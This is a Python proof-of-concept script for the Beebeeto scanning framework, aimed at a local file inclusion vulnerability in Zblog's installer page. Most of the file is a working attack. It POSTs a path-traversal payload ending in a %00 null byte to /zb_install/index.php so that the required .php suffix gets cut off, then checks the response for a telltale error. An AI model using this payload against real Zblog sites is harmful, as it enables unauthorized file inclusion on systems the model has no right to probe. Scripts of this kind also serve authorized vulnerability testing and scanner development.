#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import requests

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2015-0111',
            'name': 'Zblog /zb_install/index.php 本地文件包含漏洞 POC',
            'author': 'user1018',
            'create_date': '2015-06-17',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Zblog',
            'vul_version': ['*'],
            'type': 'Local File Inclusion',
            'tag': ['Zblog最新版本漏洞', 'Zblog 本地文件包含漏洞', 'php'],
            'desc': '''
                    虽然限制了必须为.php后缀的，但是因为没对POST转义，所以我们可以截断后面的.php。
                    ''',
            'references': ['http://0day5.com/archives/3213',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        filepath = '/zb_install/index.php'
        payload = 'zbloglang=../../zb_system/image/admin/none.gif%00'
        verify_url = args['options']['target'] + filepath
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
            print '[*] POST: ' + payload
        req = requests.post(verify_url, data=payload)
        if 'Cannot use a scalar value' in req.content and req.status_code == 500:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    exploit = verify


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())